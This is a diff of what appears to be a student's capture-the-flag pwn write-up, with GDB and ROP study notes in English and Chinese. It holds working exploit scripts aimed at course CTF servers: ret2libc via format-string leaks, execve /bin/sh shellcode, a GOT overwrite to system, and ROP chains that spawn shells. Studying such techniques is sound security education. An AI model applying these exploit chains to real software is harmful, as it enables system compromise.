@@ -1,9 +1,11 @@
+# helloworld
 
-# helloworld            
- return to magic function
+return to magic function
+
 <details>
 
 - return to magic function to call shell
+
 ```py
 from pwn import *
 
@@ -25,11 +27,14 @@ p.interactive()
 
 </details>
 
-# helloworld_again      
- return to magic function
+# helloworld_again
+
+return to magic function
+
 <details>
 
 - return to magic function to call shell, but input must start with hellowrld, and ret address must be stack aligned
+
 ```py
 
 from pwn import *
@@ -40,7 +45,7 @@ print("addr of helloworld is : 0x",'%x'%elf.sym['helloworld'])
 
 #we know that char s[32] has len 32
 #and that the ret addr is 8 bytes above char s[32]
-# looking at the memory, we see that the lea of helloworld is at 0x401263 
+# looking at the memory, we see that the lea of helloworld is at 0x401263
 
 #to bypass the length check and strcmp, we input the following:
 pause()
@@ -53,14 +58,16 @@ p.close()
 
 </details>
 
-# sakana                
+# sakana
 
 format string+ret2 libc
+
 <details>
 
-- 這題防禦機制開滿，但有format string漏洞。
+- 這題防禦機制開滿，但有 format string 漏洞。
 - use format string to leak pie base and libc base(offsets can be found with gdb info proc map)
 - then ret2 libc
+
 ```py
 from pwn import *
 
@@ -143,13 +150,15 @@ r.interactive()
 
 </details>
 
-# modohayaku            
+# modohayaku
+
 shellcode
 
 <details>
 
 - shellcode must contain certain bytes
-- 可以用pwn.asm()來拚出shell code
+- 可以用 pwn.asm()來拚出 shell code
+
 ```py
 from pwn import *
 
@@ -160,7 +169,7 @@ elf=ELF('./modohayaku')
 #p = process('./modohayaku')
 r = remote('ctf.adl.tw', 10002)
 
-payload = flat(b'\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x53\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x31\xC0\x3c\x0c\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x3c\x87\x48\xF7\xDB\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x53\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x5F\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x99\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x52\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x57\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x5E\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\xB0\x3B\x3c\x87\x3c\x87\x3c\x87\x3c\x0c\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x0F\x05\x3c\x87\x3c\x87\x3c\x87\x3c\x0c') 
+payload = flat(b'\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x53\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x31\xC0\x3c\x0c\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x3c\x87\x48\xF7\xDB\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x53\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x5F\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x99\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x52\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x57\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x5E\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\xB0\x3B\x3c\x87\x3c\x87\x3c\x87\x3c\x0c\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x0F\x05\x3c\x87\x3c\x87\x3c\x87\x3c\x0c')
 
 r.sendafter(b'!!!',payload)
 
@@ -171,21 +180,24 @@ r.interactive()
 
 </details>
 
-# modomodohayaku      
+# modomodohayaku
+
 shellcode
+
 <details>
 
 Shellcode must match certain pattern:
+
 - every 6 bytes must start with 0xc 0x87 0x63
 - shell code cannot contain 'k','i','r','t','o', NOP
 - shell code must be no greater than 96 bytes
 
 Obviously we cannot call execv bin/sh, since this contains 'i'.  
-**key point**  <font color = #FF0080 > We can pass in other shell code from stdin.  </font>
- 
+**key point** <font color = #FF0080 > We can pass in other shell code from stdin. </font>
+
 1. We set up the registers to call syscall read, as shown below  
-![alt text](./modomodohayaku/syscall_read.jpg)  
-2. We set rdi to 0, since this is the file descriptor of stdin  
+   ![alt text](./modomodohayaku/syscall_read.jpg)
+2. We set rdi to 0, since this is the file descriptor of stdin
 3. we need some address to store our input. It turns out we can use rbp, since its is opcode is just 1 byte. Thus we set rsi to rbp.
 4. Set rdx to 0x20, since this is the size of our second shell code
 5. Set rax to zero, since 0 is read's syscall number
@@ -247,23 +259,27 @@ second_shell_code="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\
 r.send(flat([second_shell_code]))
 r.interactive()
 
- 
+
 ```
 
 </details>
 
-# modomodomodohayaku   
-- not solved
-# cyberpsychosis   
-got
-<details>
+# modomodomodohayaku
 
+- not solved
+
+# cyberpsychosis
+
+got
+
+<details>
 
 - find libc base with showinfo
 - overwrite atol's got address with libc system with edit_info
 - input bin sh into buffer
 - buffer gets passed into system
-![alt text](./cyberpsychosis/offset_notes.jpg)
+  ![alt text](./cyberpsychosis/offset_notes.jpg)
+
 ```py
 from pwn import *
 
@@ -283,7 +299,7 @@ r.sendline(b'2')#implant stuff
 sleep(0.1)
 r.sendline(b'0')# at index 0
 sleep(0.1)
-r.sendline(b'123456789')#implant name 
+r.sendline(b'123456789')#implant name
 sleep(0.1)
 r.sendline(b'999999999')#implant value
 output=r.recvuntil(b'!')#implant success!
@@ -296,11 +312,11 @@ output=r.recvuntil(b'idx> ')
 r.sendline(b'-3')#show implant at index 0
 sleep(0.1)
 output=r.recvuntil(b'value: ')#recv stuff
-output=r.recvuntil(b'\n')#this is the printf@GLIBC_2.2.5 
+output=r.recvuntil(b'\n')#this is the printf@GLIBC_2.2.5
 #offset of printf@GLIBC_2.2.5 is 0x61c90 from libc base(found with gdb info proc map and got)
 output=int(output[:-1])#shave off \n
-print("address of printf@glibc :%#x"%output) 
-print("address of libc base is :%#x"%(output-0x61c90)) 
+print("address of printf@glibc :%#x"%output)
+print("address of libc base is :%#x"%(output-0x61c90))
 libc_base=output-0x61c90#we have our libc base
 sleep(0.1)
 
@@ -331,16 +347,19 @@ r.interactive()
 
 </details>
 
+# Test_Subject_087
 
-# Test_Subject_087      
 - not solved
-# project_alicization   
+
+# project_alicization
+
 srand()+shellcode
 
 <details>
 
 - guess password using the same srand(time(0))
 - input shellcode that contain all ascii bytes
+
 ```py
 
 from pwn import *
@@ -380,7 +399,7 @@ shellcode = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H
 
 r.sendline(b'System Call generate shellcode element')
 payload=flat([
-    
+
     shellcode
 ])
 r.send(payload)
@@ -392,15 +411,19 @@ r.interactive()
 
 </details>
 
-# guitar_hero           
+# guitar_hero
+
 - not solved
+
 # how2know
+
 shellcode
 
 <details>
 
 - leak the flag address with rdi
 - write a shell code that compares each character of the flag, and exit upon a match
+
 ```py
 import pwn
 import time
@@ -441,195 +464,209 @@ for i in range(0, 0x30):
             break
 print(flag)
 ```
+
 </details>
 
 # rop++
+
 rop
 
 <details>
 
 - solution1:
-    - set up rop chain to read bin/sh into bss segment
-    - call syscall execv
-    ```py
-    import pwn
 
-    pwn.context.log_level = "debug"
-    pwn.context.arch = "amd64"
+  - set up rop chain to read bin/sh into bss segment
+  - call syscall execv
 
-    bss_addr = 0x4c72a0 # .bss address
-    mov_rsi_rax = 0x449fa5 # mov qword ptr [rsi], rax ; ret
-    pop_rax = 0x447b27 # pop rax ; ret
-    pop_rsi = 0x409e6e # pop rsi ; ret
+  ```py
+  import pwn
 
-    pop_rdi = 0x401e3f # pop rdi ; ret
-    pop_rax_pop_rdx_pop_rbx = 0x47ed0a # pop rax ; pop rdx ; pop rbx ; ret
-    syscall = 0x401bf4 # syscall
+  pwn.context.log_level = "debug"
+  pwn.context.arch = "amd64"
 
-    payload = pwn.flat(
-    b"A" * 40,
-    pop_rax, b"/bin/sh\0", # rax <- '/bin/sh'
-    pop_rsi, bss_addr, # rsi <- 0x4c72a0
-    mov_rsi_rax, # [0x4c72a0] <- '/bin/sh'
+  bss_addr = 0x4c72a0 # .bss address
+  mov_rsi_rax = 0x449fa5 # mov qword ptr [rsi], rax ; ret
+  pop_rax = 0x447b27 # pop rax ; ret
+  pop_rsi = 0x409e6e # pop rsi ; ret
 
-    pop_rdi, bss_addr,
-    pop_rsi, 0,
-    pop_rax_pop_rdx_pop_rbx, 0x3b, 0, 0,
-    syscall,
-    )
+  pop_rdi = 0x401e3f # pop rdi ; ret
+  pop_rax_pop_rdx_pop_rbx = 0x47ed0a # pop rax ; pop rdx ; pop rbx ; ret
+  syscall = 0x401bf4 # syscall
 
-    p = pwn.remote("edu-ctf.zoolab.org", 10003)
-    p.recvuntil(b"show me rop\n> ")
+  payload = pwn.flat(
+  b"A" * 40,
+  pop_rax, b"/bin/sh\0", # rax <- '/bin/sh'
+  pop_rsi, bss_addr, # rsi <- 0x4c72a0
+  mov_rsi_rax, # [0x4c72a0] <- '/bin/sh'
 
-    p.sendline(payload)
-    p.interactive()
-    ```
-- solution2:
-    - mov bin/sh to data segment
-    - call syscall execv
-    ```py
-    from pwn import *
+  pop_rdi, bss_addr,
+  pop_rsi, 0,
+  pop_rax_pop_rdx_pop_rbx, 0x3b, 0, 0,
+  syscall,
+  )
 
-    context.arch = 'amd64'
-    p = process("chal")
-    #p = remote("edu-ctf.zoolab.org", 10003)
+  p = pwn.remote("edu-ctf.zoolab.org", 10003)
+  p.recvuntil(b"show me rop\n> ")
 
-    p.recvuntil(b"show me rop\n> ")
-    pop_rdi = 0x40181a
-    pop_rsi = 0x40f14e
-    pop_rdx = 0x40171f
-    pop_rax = 0x448e67
-    syscall = 0x416a54
-    bss_addr = 0x4C2270
+  p.sendline(payload)
+  p.interactive()
+  ```
 
-    payload = flat(
-        b"A" * 40,
-        pop_rdi,
-        0x0,
-        pop_rsi,
-        bss_addr,
-        pop_rdx,
-        0x10,
-        pop_rax,
-        0x0,
-        syscall,
-        pop_rdi,
-        bss_addr,
-        pop_rsi,
-        0x0,
-        pop_rdx,
-        0x0,
-        pop_rax,
-        0x3b,
-        syscall
-    )
-    p.send(payload)
-    sleep(0.1)
-    p.send(b"/bin/sh")
-    p.interactive()
+- solution2: - mov bin/sh to data segment - call syscall execv
+  ```py
+  from pwn import \*
 
-    ```
-</details>
+      context.arch = 'amd64'
+      p = process("chal")
+      #p = remote("edu-ctf.zoolab.org", 10003)
 
+      p.recvuntil(b"show me rop\n> ")
+      pop_rdi = 0x40181a
+      pop_rsi = 0x40f14e
+      pop_rdx = 0x40171f
+      pop_rax = 0x448e67
+      syscall = 0x416a54
+      bss_addr = 0x4C2270
 
+      payload = flat(
+          b"A" * 40,
+          pop_rdi,
+          0x0,
+          pop_rsi,
+          bss_addr,
+          pop_rdx,
+          0x10,
+          pop_rax,
+          0x0,
+          syscall,
+          pop_rdi,
+          bss_addr,
+          pop_rsi,
+          0x0,
+          pop_rdx,
+          0x0,
+          pop_rax,
+          0x3b,
+          syscall
+      )
+      p.send(payload)
+      sleep(0.1)
+      p.send(b"/bin/sh")
+      p.interactive()
 
+      ```
 
+  </details>
 
-
-
-
-
-# 筆記(GDB用法、IDA用法、Ghidra用法)
+# 筆記(GDB 用法、IDA 用法、Ghidra 用法)
 
 <details>
 
 # ida usage:
+
 1. drag binary into window
 2. press f5 to see src code
 3. we can press ctrl+s to see the memory addresses
 
 # objdump usage
+
 objdump -M intel -d ./pwn/sakana/sakana
 
 # gdb usage
+
 attach 8194
+
 1. b main
 2. disas main
    disas hellowrld (to see lea addr)
-3. b *0x40125b 斷在關鍵位置
-4. 輸入字串，觀察stack
+3. b \*0x40125b 斷在關鍵位置
+4. 輸入字串，觀察 stack
+
 ## other
+
 - step
 - x/200gs 0x555555556042
 - x/200gi <addr>
-- x/5i $rsp-10	
-- vmmap查看process mapping狀況
+- x/5i $rsp-10
+- vmmap 查看 process mapping 狀況
 - search-pattern bin/sh
 - telescope 0x7ffff7f795bd 20
 - telescope $sp 200
 - finish: Continue running until just after function in the selected stack frame returns. Print the returned value (if any). This command can be abbreviated as fin.
-- break *main+140
+- break \*main+140
+
 # format string attack
+
 - rdi register(in amd 64 )holds the first argument to the function
 - rsi register(in amd 64 )holds the second argument to the function
 - in amd 64, the arguments beyond the 7th are stored in the stack. The 1st 6 are in registers
 - in format string attacks, %s treats the value on the stack or register as a pointer to some other string(maybe points to the got)
+
 # ret2libc
+
 - strings -a -t x pwn/sakana/libc-2.31.so | grep /bin/sh
+
 # piebase
+
 - we can find the pie base using gdb
 - use info proc map in gdb to find libc base
+
 # pwndbg usage
+
 - disassemble parse_cmd
 - info functions
+
 # ropper -f pwn/sakana/sakana
+
 - ropper -f pwn/sakana/sakana
 - pop rdi is used like this:provide the address to the pop rdi gadget, then put WHAT YOU WANT TO PUT INTO THE rdi register in the next word. This will put that word into the rdi. Once you are sure that you have what you need in the registers, you call the function.(system, for example)
 
 # pwntools
+
 - p64:payload construct
 
 - lib=ELF('libc.so.6')
 - lib.symbols['system']
+
 # shellcode
+
 - shellcraft -l amd64.linux.sh:list shell codes
 - msfvenom
+
 # ldd
+
 - finds dependencies
 - ldd pwn/sakana/sakana
-# readelf 找libc function offset
-- readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep "libc_start_main"
+
+# readelf 找 libc function offset
+
+- readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "libc_start_main"
+
 # BOA
+
 - rbp is the base pointer, which points to the base of the current stack frame,
-and rsp is the stack pointer, which points to the top of the current stack frame.
-- for example, in amd64, a stack looks like this:
-    - 8th parameter...
-    - 7th parameter(the 1st six are on registers)
-    - return address
-    - rbp-->stack bottom
-    - canary
-    - char[64]
-    - rsp-->stack top
-if there is a buffer, rsp will point to it
+  and rsp is the stack pointer, which points to the top of the current stack frame.
+- for example, in amd64, a stack looks like this: - 8th parameter... - 7th parameter(the 1st six are on registers) - return address - rbp-->stack bottom - canary - char[64] - rsp-->stack top
+  if there is a buffer, rsp will point to it
 - $sp is stack pointer
 - GOT (Global Offset Table)
-: GOT存著很多個一樣大小的元素，形成一個table(基本上就是array)。
-每個元素都是一個指標(所以說32位元機器一個元素4個byte，64位元就是8個byte)，
-指向程式所需要的變數或者是函數，也有可能是系統需要的指標。
-
+  : GOT 存著很多個一樣大小的元素，形成一個 table(基本上就是 array)。
+  每個元素都是一個指標(所以說 32 位元機器一個元素 4 個 byte，64 位元就是 8 個 byte)，
+  指向程式所需要的變數或者是函數，也有可能是系統需要的指標。
 
 - plt:
-PLT存著很多個一樣大小的元素，形成一個table(基本上就是array)。每個元素都是一小段程式碼，
-第一個元素是公共plt，負責呼叫動態鏈接器。從第二個開始每個元素分別對應到一個動態鏈接的函數，
-會使用該函數所對應之GOT元素。
+  PLT 存著很多個一樣大小的元素，形成一個 table(基本上就是 array)。每個元素都是一小段程式碼，
+  第一個元素是公共 plt，負責呼叫動態鏈接器。從第二個開始每個元素分別對應到一個動態鏈接的函數，
+  會使用該函數所對應之 GOT 元素。
 
-意思就是一個動態鏈接函數對應到一個GOT元素(指標)，一個PLT元素(執行碼)。CPU執行PLT存的程式碼，使用GOT存的指標想辦法跳到該函數
+意思就是一個動態鏈接函數對應到一個 GOT 元素(指標)，一個 PLT 元素(執行碼)。CPU 執行 PLT 存的程式碼，使用 GOT 存的指標想辦法跳到該函數
 -First six arguments are in rdi, rsi, rdx, rcx, r8d, r9d
 the difference between lea and mov is: mov is used to move data, lea is used to move addresses
 
 # how to gdb attach
+
 1. Find the process id (pid) with the ps command: $ ps -C program -o pid h pid.
 2. Replace program with a file name or path to the program.
-Attach GDB to this process: $ gdb program -p pid.
+   Attach GDB to this process: $ gdb program -p pid.
 
 </details>
